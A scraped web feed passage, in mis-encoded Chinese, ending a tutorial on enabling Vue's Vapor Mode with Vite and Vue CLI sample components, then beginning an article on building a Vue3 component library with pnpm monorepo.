<p>æ¡ˆä¾‹ï¼šä¼ä¸šå®˜ç½‘é¦–é¡µï¼ŒåŒ…å«å¯¼èˆªæ ã€banner å›¾ã€äº§å“ä»‹ç»ã€è”ç³»æˆ‘ä»¬ç­‰é™æ€å†…å®¹ï¼Œå‡ ä¹æ— åŠ¨æ€æ›´æ–°é€»è¾‘ï¼Œéå¸¸é€‚åˆ Vapor Modeã€‚</p>
<h5 data-id="heading-7">æ­¥éª¤ 1ï¼šé…ç½® Vite ç¼–è¯‘é€‰é¡¹</h5>
<p>ä¿®æ”¹ <code>vite.config.js</code>ï¼Œé€šè¿‡ <code>@vitejs/plugin-vue</code> é…ç½® Vue ç¼–è¯‘å™¨é€‰é¡¹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>;
<span class="hljs-keyword">import</span> vue <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-vue'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">vue</span>({
      <span class="hljs-attr">compilerOptions</span>: {
        <span class="hljs-attr">mode</span>: <span class="hljs-string">'vapor'</span> <span class="hljs-comment">// æ ¸å¿ƒé…ç½®ï¼šå¼€å¯ Vapor Mode</span>
      }
    })
  ]
});
</code></pre>
<h5 data-id="heading-8">æ­¥éª¤ 2ï¼šç¼–å†™é™æ€å®˜ç½‘ç»„ä»¶</h5>
<p>åˆ›å»º<code>src/components/CompanyHome.vue</code>ï¼ŒåŒ…å«å¯¼èˆªã€bannerã€äº§å“ä»‹ç»ç­‰é™æ€å†…å®¹ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">
&lt;template&amp;gt;
  &amp;lt;div class="company-home"&amp;gt;
    &lt;!-- å¯¼èˆªæ ï¼ˆé™æ€ï¼‰ --&gt;
    &lt;nav class="nav"&gt;
      &lt;div class="logo"&gt;Vue ç§‘æŠ€&lt;/div&gt;
      &lt;ul class="nav-list"&gt;
        &lt;li&gt;&lt;a href="#home"&gt;é¦–é¡µ&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href="#product"&gt;äº§å“ä¸­å¿ƒ&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href="#about"&gt;å…³äºæˆ‘ä»¬&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href="#contact"&gt;è”ç³»æˆ‘ä»¬&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/nav&gt;&lt;!-- Banner å›¾ï¼ˆé™æ€ï¼‰ --&gt;
    &lt;div class="banner"&gt;
      &lt;img src="/banner.jpg" alt="ä¼ä¸šBanner"&gt;
    &lt;/div&amp;gt;

    &lt;!-- äº§å“ä»‹ç»ï¼ˆé™æ€ï¼‰ --&gt;
    &lt;section id="product" class="product-section"&gt;
      &lt;h2 class="section-title"&gt;äº§å“ä¸­å¿ƒ&lt;/h2&gt;
      &lt;div class="product-list"&gt;
        &lt;div class="product-item"&gt;
          &lt;img src="/product1.jpg" alt="äº§å“1"&gt;
          &lt;h3&gt;Vue æ€§èƒ½ä¼˜åŒ–æ–¹æ¡ˆ&lt;/h3&gt;
          &lt;p&gt;åŸºäº Vapor Mode çš„å‰ç«¯æ€§èƒ½ä¼˜åŒ–æœåŠ¡ï¼ŒåŠ©åŠ›é¡¹ç›®æ€§èƒ½é£™å‡&lt;/p&gt;
        &lt;/div&gt;
        &lt;div class="product-item"&gt;
          &lt;img src="/product2.jpg" alt="äº§å“2"&gt;
          &lt;h3&gt;è·¨å¹³å°å¼€å‘æ¡†æ¶&lt;/h3&gt;
          &lt;p&gt;ä¸€å¥—ä»£ç é€‚é…å¤šç«¯ï¼Œå…¼é¡¾æ€§èƒ½ä¸å¼€å‘æ•ˆç‡&lt;/p&gt;
        &lt;/div&gt;
        &lt;div class="product-item"&gt;
          &lt;img src="/product3.jpg" alt="äº§å“3"&gt;
          &lt;h3&gt;å‰ç«¯ç›‘æ§ç³»ç»Ÿ&lt;/h3&gt;
          &lt;p&gt;å®æ—¶ç›‘æ§é¡¹ç›®æ€§èƒ½ï¼Œç²¾å‡†å®šä½é—®é¢˜&lt;/p&gt;
        &lt;/div&gt;
      &lt;/div&amp;gt;
    &amp;lt;/section&amp;gt;

    &lt;!-- è”ç³»æˆ‘ä»¬ï¼ˆé™æ€ï¼‰ --&gt;
    &lt;section id="contact" class="contact-section"&gt;
      &lt;h2 class="section-title"&gt;è”ç³»æˆ‘ä»¬&lt;/h2&gt;
      &lt;p&gt;åœ°å€ï¼šåŒ—äº¬å¸‚æœé˜³åŒº XX å¤§å¦ 15 å±‚&lt;/p&gt;
      &lt;p&gt;ç”µè¯ï¼š400-123-4567&lt;/p&gt;
      &lt;p&gt;é‚®ç®±ï¼šcontact@vue-tech.com&lt;/p&gt;
    &lt;/section&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
// æ— åŠ¨æ€é€»è¾‘ï¼Œä»…é™æ€å±•ç¤º
&lt;/script&gt;

&lt;style scoped&gt;
.company-home {
  width: 1200px;
  margin: 0 auto;
}

.nav {
  display: flex;
  justify-content: space-between;
  align-items: center;
  height: 60px;
  border-bottom: 1px solid #eee;
}

.logo {
  font-size: 24px;
  font-weight: bold;
  color: #42b983;
}

.nav-list {
  display: flex;
  list-style: none;
}

.nav-list li {
  margin-left: 30px;
}

.nav-list a {
  text-decoration: none;
  color: #333;
  font-size: 16px;
}

.banner img {
  width: 100%;
  height: 400px;
  object-fit: cover;
  margin: 20px 0;
}

.section-title {
  font-size: 28px;
  text-align: center;
  margin: 40px 0 20px;
  color: #333;
}

.product-list {
  display: flex;
  justify-content: space-between;
  margin: 40px 0;
}

.product-item {
  width: 30%;
  text-align: center;
}

.product-item img {
  width: 100%;
  height: 200px;
  object-fit: cover;
  border-radius: 8px;
}

.product-item h3 {
  margin: 15px 0;
  color: #333;
}

.product-item p {
  color: #666;
  line-height: 1.5;
}

.contact-section {
  text-align: center;
  padding: 40px 0;
  background-color: #f5f5f5;
  border-radius: 8px;
  margin: 40px 0;
}

.contact-section p {
  color: #666;
  line-height: 1.8;
  font-size: 16px;
}
&lt;/style&gt;
</code></pre>
<h5 data-id="heading-9">æ­¥éª¤ 3ï¼šåœ¨ App.vue ä¸­å¼•å…¥ç»„ä»¶</h5>
<pre><code class="hljs language-vue" lang="vue">
&lt;template&gt;
  &lt;CompanyHome /&gt;
&lt;/template&gt;

&lt;script setup&gt;
import CompanyHome from './components/CompanyHome.vue';
&lt;/script&gt;

&lt;style&gt;
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: 'Microsoft YaHei', sans-serif;
}
&lt;/style&gt;
</code></pre>
<h5 data-id="heading-10">æ­¥éª¤ 4ï¼šè¿è¡Œå¹¶éªŒè¯æ•ˆæœ</h5>
<p>æ‰§è¡Œ <code>npm run dev</code> å¯åŠ¨é¡¹ç›®ï¼Œæ‰“å¼€æµè§ˆå™¨å¼€å‘è€…å·¥å…·çš„ã€ŒPerformanceã€é¢æ¿ï¼Œå½•åˆ¶é¡µé¢é¦–æ¬¡åŠ è½½è¿‡ç¨‹ï¼š</p>
<ul>
<li>
<p>æ—  VNode ç›¸å…³å‡½æ•°è°ƒç”¨ï¼ˆå¦‚ <code>createVNode</code>ã€<code>patch</code>ï¼‰ï¼›</p>
</li>
<li>
<p>ç›´æ¥æ‰§è¡Œ <code>document.createElement</code> ç­‰åŸç”Ÿ DOM æ“ä½œï¼›</p>
</li>
<li>
<p>é¦–æ¬¡æ¸²æŸ“è€—æ—¶è¾ƒä¼ ç»Ÿæ¨¡å¼æ˜¾è‘—é™ä½ã€‚</p>
</li>
</ul>
<h4 data-id="heading-11">ç¤ºä¾‹ 2ï¼šVue CLI é¡¹ç›®å¼€å¯ Vapor Modeï¼ˆç®€å•ä¿¡æ¯å±•ç¤ºç»„ä»¶ï¼‰</h4>
<p>åœºæ™¯ï¼šåå°ç®¡ç†ç³»ç»Ÿä¸­çš„ã€Œç”¨æˆ·ä¿¡æ¯è¯¦æƒ…é¡µã€ï¼Œé™¤äº†ç”¨æˆ·åŸºæœ¬ä¿¡æ¯å±•ç¤ºå¤–ï¼Œæ— é¢‘ç¹åŠ¨æ€æ›´æ–°ï¼Œé€‚åˆå¼€å¯ Vapor Mode ä¼˜åŒ–æ¸²æŸ“æ€§èƒ½ã€‚</p>
<h5 data-id="heading-12">æ­¥éª¤ 1ï¼šé…ç½® Vue CLI ç¼–è¯‘é€‰é¡¹</h5>
<p>ä¿®æ”¹ <code>vue.config.js</code>ï¼Œé€šè¿‡ <code>vue-loader</code> é…ç½®ç¼–è¯‘å™¨é€‰é¡¹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">chainWebpack</span>: <span class="hljs-function"><span class="hljs-params">config</span> =&gt;</span> {
    config.<span class="hljs-property">module</span>
      .<span class="hljs-title function_">rule</span>(<span class="hljs-string">'vue'</span>)
      .<span class="hljs-title function_">use</span>(<span class="hljs-string">'vue-loader'</span>)
      .<span class="hljs-title function_">tap</span>(<span class="hljs-function"><span class="hljs-params">options</span> =&gt;</span> {
        options.<span class="hljs-property">compilerOptions</span> = {
          ...options.<span class="hljs-property">compilerOptions</span>,
          <span class="hljs-attr">mode</span>: <span class="hljs-string">'vapor'</span> <span class="hljs-comment">// å¼€å¯ Vapor Mode</span>
        };
        <span class="hljs-keyword">return</span> options;
      });
  }
};
</code></pre>
<h5 data-id="heading-13">æ­¥éª¤ 2ï¼šç¼–å†™ç”¨æˆ·ä¿¡æ¯å±•ç¤ºç»„ä»¶</h5>
<p>åˆ›å»º <code>src/components/UserDetail.vue</code>ï¼Œå±•ç¤ºç”¨æˆ·åŸºæœ¬ä¿¡æ¯ï¼ˆé™æ€å†…å®¹ä¸ºä¸»ï¼Œä»…åˆå§‹åŒ–æ—¶åŠ è½½æ•°æ®ï¼‰ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">
&lt;template&gt;
  &lt;div class="user-detail"&gt;
    &lt;h2 class="detail-title"&gt;ç”¨æˆ·ä¿¡æ¯è¯¦æƒ…&lt;/h2&gt;
    &lt;div class="detail-content"&gt;
      &lt;div class="detail-item"&gt;
        &lt;span class="label"&gt;ç”¨æˆ· IDï¼š&lt;/span&gt;
        &lt;span class="value"&gt;{{ userId }}&lt;/span&gt;
      &lt;/div&gt;
      &lt;div class="detail-item"&gt;
        &lt;span class="label"&gt;ç”¨æˆ·åï¼š&lt;/span&gt;
        &lt;span class="value"&gt;{{ username }}&lt;/span&gt;
      &lt;/div&gt;
      &lt;div class="detail-item"&gt;
        &lt;span class="label"&gt;æ€§åˆ«ï¼š&lt;/span&gt;
        &lt;span class="value"&gt;{{ gender }}&lt;/span&gt;
      &lt;/div&gt;
      &lt;div class="detail-item"&gt;
        &lt;span class="label"&gt;é‚®ç®±ï¼š&lt;/span&gt;
        &lt;span class="value"&gt;{{ email }}&lt;/span&gt;
      &lt;/div&gt;
      &lt;div class="detail-item"&gt;
        &lt;span class="label"&gt;æ³¨å†Œæ—¶é—´ï¼š&lt;/span&gt;
        &lt;span class="value"&gt;{{ registerTime }}&lt;/span&gt;
      &lt;/div&gt;
      &lt;div class="detail-item"&gt;
        &lt;span class="label"&gt;è´¦å·çŠ¶æ€ï¼š&lt;/span&gt;
        &lt;span class="value status-normal"&gt;æ­£å¸¸&lt;/span&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { onMounted, ref } from 'vue';

// åˆå§‹åŒ–æ•°æ®ï¼ˆä»…åŠ è½½ä¸€æ¬¡ï¼Œæ— åç»­æ›´æ–°ï¼‰
const userId = ref('');
const username = ref('');
const gender = ref('');
const email = ref('');
const registerTime = ref('');

onMounted(() =&gt; {
  // æ¨¡æ‹Ÿæ¥å£è¯·æ±‚è·å–ç”¨æˆ·æ•°æ®
  setTimeout(() =&gt; {
    userId.value = 'U20240601001';
    username.value = 'å¼ ä¸‰';
    gender.value = 'ç”·';
    email.value = 'zhangsan@example.com';
    registerTime.value = '2024-06-01 10:30:00';
  }, 500);
});
&lt;/script&gt;

&lt;style scoped&gt;
.user-detail {
  width: 800px;
  margin: 40px auto;
  padding: 30px;
  border: 1px solid #eee;
  border-radius: 8px;
  background-color: #fff;
}

.detail-title {
  font-size: 24px;
  color: #333;
  margin-bottom: 25px;
  border-bottom: 1px solid #eee;
  padding-bottom: 15px;
}

.detail-content {
  display: flex;
  flex-direction: column;
  gap: 20px;
}

.detail-item {
  display: flex;
  align-items: center;
}

.label {
  font-size: 16px;
  color: #666;
  width: 100px;
  text-align: right;
  margin-right: 20px;
}

.value {
  font-size: 16px;
  color: #333;
}

.status-normal {
  color: #42b983;
  font-weight: bold;
}
&lt;/style&gt;
</code></pre>
<h5 data-id="heading-14">æ­¥éª¤ 3ï¼šå¼•å…¥ç»„ä»¶å¹¶è¿è¡Œ</h5>
<p>åœ¨ App.vue ä¸­å¼•å…¥ <code>UserDetail</code> ç»„ä»¶ï¼Œæ‰§è¡Œ <code>npm run dev</code> å¯åŠ¨é¡¹ç›®ã€‚ç”±äºæ•°æ®ä»…åˆå§‹åŒ–åŠ è½½ä¸€æ¬¡ï¼Œåç»­æ— åŠ¨æ€æ›´æ–°ï¼ŒVapor Mode ä¼šè·³è¿‡è™šæ‹Ÿ DOM çš„ diff ç¯èŠ‚ï¼ŒåŠ è½½å®Œæˆåçš„é¡µé¢æ¸²æŸ“æ€§èƒ½å¤§å¹…æå‡ã€‚</p>
<h3 data-id="heading-15">å››ã€ä¼ ç»Ÿæ¨¡å¼ vs Vapor Mode æ ¸å¿ƒå¯¹æ¯”</h3>
<p>ä¸ºäº†æ›´æ¸…æ™°åœ°é€‰æ‹©åˆé€‚çš„æ¨¡å¼ï¼Œæˆ‘ä»¬æ•´ç†äº†æ ¸å¿ƒç‰¹æ€§å¯¹æ¯”è¡¨ï¼š</p>








































<table><thead><tr><th>ç‰¹æ€§</th><th>ä¼ ç»Ÿè™šæ‹Ÿ DOM æ¨¡å¼</th><th>Vapor Mode æ¨¡å¼</th></tr></thead><tbody><tr><td>æ¸²æŸ“æœºåˆ¶</td><td>VNode æ„å»º + diff å¯¹æ¯” + DOM æ›´æ–°</td><td>ç›´æ¥ç”ŸæˆåŸç”Ÿ DOM æ“ä½œä»£ç ï¼Œæ—  VNode/diff</td></tr><tr><td>æ€§èƒ½è¡¨ç°</td><td>ä¸­ç­‰ï¼Œå­˜åœ¨ä¸­é—´å±‚å¼€é”€</td><td>æ›´é«˜ï¼Œé™æ€å†…å®¹æ¸²æŸ“ä¼˜åŠ¿æ˜æ˜¾</td></tr><tr><td>è¿è¡Œæ—¶ä½“ç§¯</td><td>è¾ƒå¤§ï¼ŒåŒ…å«è™šæ‹Ÿ DOM æ ¸å¿ƒä»£ç </td><td>æ›´å°ï¼Œå‰”é™¤è™šæ‹Ÿ DOM ç›¸å…³ä»£ç </td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>åŠ¨æ€å†…å®¹ä¸°å¯Œã€é¢‘ç¹æ›´æ–°ï¼ˆå¦‚å¤æ‚è¡¨å•ã€å®æ—¶æ•°æ®çœ‹æ¿ï¼‰</td><td>é™æ€å†…å®¹å¤šã€æ›´æ–°é¢‘ç‡ä½ï¼ˆå¦‚å®˜ç½‘ã€æ–‡æ¡£ã€ä¿¡æ¯è¯¦æƒ…é¡µï¼‰</td></tr><tr><td>çµæ´»æ€§</td><td>é«˜ï¼Œæ”¯æŒè·¨å¹³å°ã€å¤æ‚åŠ¨æ€é€»è¾‘</td><td>ä¸­ç­‰ï¼Œä¸“æ³¨äºæµè§ˆå™¨ DOM æ¸²æŸ“</td></tr><tr><td>é…ç½®æˆæœ¬</td><td>æ— ï¼Œé»˜è®¤å¼€å¯</td><td>ä½ï¼Œä»…éœ€æ·»åŠ ç¼–è¯‘é€‰é¡¹</td></tr></tbody></table>
<h3 data-id="heading-16">äº”ã€é¿å‘</h3>
<ul>
<li>
<p>å¼€å¯ Vapor Mode åï¼Œé¿å…ä½¿ç”¨è™šæ‹Ÿ DOM ç›¸å…³ APIï¼Œå¦åˆ™å¯èƒ½å¯¼è‡´æŠ¥é”™ï¼›</p>
</li>
<li>
<p>å¯¹äºæ··åˆé™æ€å’ŒåŠ¨æ€å†…å®¹çš„é¡µé¢ï¼Œå¯å°†é™æ€éƒ¨åˆ†æŠ½ç¦»ä¸ºç‹¬ç«‹ç»„ä»¶ï¼Œå•ç‹¬å¼€å¯ Vapor Modeï¼ŒåŠ¨æ€éƒ¨åˆ†ä¿ç•™ä¼ ç»Ÿæ¨¡å¼ï¼›</p>
</li>
<li>
<p>æµ‹è¯•ç¯å¢ƒå»ºè®®å…ˆå°èŒƒå›´è¯•ç‚¹ï¼ˆå¦‚å•ä¸ªé™æ€é¡µé¢ï¼‰ï¼ŒéªŒè¯åŠŸèƒ½æ­£å¸¸åå†é€æ­¥æ¨å¹¿ï¼›</p>
</li>
<li>
<p>Vapor Mode ä»åœ¨æŒç»­è¿­ä»£ä¼˜åŒ–ï¼Œéƒ¨åˆ†é«˜çº§ç‰¹æ€§ï¼ˆå¦‚ <code>teleport</code>ã€<code>suspense</code>ï¼‰çš„æ”¯æŒå¯èƒ½ä¸å®Œå–„ï¼Œå»ºè®®å…³æ³¨ Vue å®˜æ–¹æ›´æ–°æ—¥å¿—ã€‚</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€ŠVue3 ç»„ä»¶åº“æ­å»ºæŒ‡åŒ—ï¼špnpm + monorepo + ä»£ç æäº¤è§„èŒƒ+ BEM ç¯å¢ƒé…ç½®ã€‹]]></title>    <link>https://juejin.cn/post/7594851429163057186</link>    <guid>https://juejin.cn/post/7594851429163057186</guid>    <pubDate>2026-01-14T14:35:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594851429163057186" data-draft-id="7594851429163024418" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€ŠVue3 ç»„ä»¶åº“æ­å»ºæŒ‡åŒ—ï¼špnpm + monorepo + ä»£ç æäº¤è§„èŒƒ+ BEM ç¯å¢ƒé…ç½®ã€‹"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js"/> <meta itemprop="datePublished" content="2026-01-14T14:35:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§é¸¡çˆª"/> <meta itemprop="url" content="https://juejin.cn/user/1486957885265400"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€ŠVue3 ç»„ä»¶åº“æ­å»ºæŒ‡åŒ—ï¼špnpm + monorepo + ä»£ç æäº¤è§„èŒƒ+ BEM ç¯å¢ƒé…ç½®ã€‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1486957885265400/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§é¸¡çˆª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T14:35:36.000Z" title="Wed Jan 14 2026 14:35:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue3 ç»„ä»¶åº“æ­å»ºæŒ‡åŒ—ï¼špnpm + monorepo ç¯å¢ƒé…ç½®</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec5022f09b064b0aa64ec6e55188e2ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn6bih54iq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006135&amp;x-signature=ZlTQSfb%2B6cSbDxgvo1DnzJEdH8I%3D" alt="cgi-bin_mmwebwx-bin_webwxgetmsgimg_&amp;MsgID=8950145656340265805&amp;skey=@crypt_ded58368_b55261bd837b5d183c332e414732255f&amp;mmweb_appid=wx_webfilehelper.jpeg" loading="lazy"/></p>
<blockquote>
<p>ä½œä¸ºä¸€ä¸ªæœ‰è¿½æ±‚çš„å‰ç«¯å¼€å‘è€…ï¼Œæ‹¥æœ‰ä¸€å¥—è‡ªå·±çš„ç»„ä»¶åº“ä¸ä»…æ˜¯æŠ€æœ¯å®åŠ›çš„è¯æ˜ï¼Œæ›´æ˜¯æå‡å›¢é˜Ÿæ•ˆç‡çš„åˆ©å™¨ã€‚æœ¬æ–‡å°†æ‰‹æŠŠæ‰‹å¸¦ä½ ä½¿ç”¨æœ€æ–°çš„æŠ€æœ¯æ ˆï¼ˆVue3 + Vite + TypeScript + pnpm Monorepoï¼‰ä»é›¶æ­å»ºä¸€ä¸ªä¼ä¸šçº§ç»„ä»¶åº“çš„åŸºç¡€æ¶æ„ã€‚</p>
</blockquote>
<h3 data-id="heading-1">1. ä»€ä¹ˆæ˜¯ Monorepoï¼Ÿï¼ˆä»â€œæ‰¾å·¥å…·â€è¯´èµ·ï¼‰</h3>
<p>åœ¨æ­£å¼åŠ¨æ‰‹å‰ï¼Œæˆ‘ä»¬è¦å…ˆç†è§£ <strong>Monorepoï¼ˆå•ä»£ç ä»“åº“ï¼‰</strong>ã€‚</p>
<p>æƒ³è±¡ä¸€ä¸‹ä½ æ­£åœ¨è£…ä¿®æˆ¿å­ï¼š</p>
<ul>
<li><strong>Multirepoï¼ˆå¤šä»“åº“ï¼‰</strong>ï¼šä½ æŠŠé”¤å­æ”¾åœ¨å§å®¤ï¼Œé”¯å­æ”¾åœ¨å¨æˆ¿ï¼Œèºä¸é’‰æ”¾åœ¨åœ°ä¸‹å®¤ã€‚æ¯æ¬¡ä½ æƒ³é’‰ä¸ªæ¶å­ï¼Œå¾—åœ¨ä¸‰ä¸ªæˆ¿é—´ä¹‹é—´æ¥å›è·‘ã€‚å¦‚æœé”¤å­å‡çº§äº†ï¼Œä½ å¯èƒ½è¿˜å¾—å»å…¶ä»–æˆ¿é—´æ£€æŸ¥é”¯å­è¿˜èƒ½ä¸èƒ½é…åˆã€‚</li>
<li><strong>Monorepoï¼ˆå•ä»“åº“ï¼‰</strong>ï¼šä½ å‡†å¤‡äº†ä¸€ä¸ªå·¨å¤§çš„<strong>ä¸“ä¸šå·¥å…·ç®±</strong>ã€‚é”¤å­ã€é”¯å­ã€èºä¸é’‰å…¨éƒ½æ•´é½åœ°æ‘†åœ¨ä¸åŒçš„éš”å±‚é‡Œã€‚</li>
</ul>
<h4 data-id="heading-2">ä¸ºä»€ä¹ˆç»„ä»¶åº“ä¸€å®šè¦ç”¨ Monorepoï¼Ÿ</h4>
<ol>
<li><strong>â€œè¿‘æ°´æ¥¼å°å…ˆå¾—æœˆâ€ (ä»£ç å…±äº«)</strong>ï¼š
